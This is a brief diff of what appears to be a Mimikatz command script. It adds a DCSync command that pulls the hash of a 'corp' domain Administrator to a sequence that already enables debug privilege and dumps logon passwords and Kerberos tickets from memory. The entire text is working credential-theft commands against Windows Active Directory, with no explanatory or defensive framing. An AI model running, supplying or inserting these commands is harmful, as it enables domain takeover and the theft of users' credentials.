@@ -5,3 +5,5 @@ privilege::debug
 sekurlsa::logonpasswords
 
 sekurlsa::tickets
+
+lsadump::dcsync /user:corp\Administrator
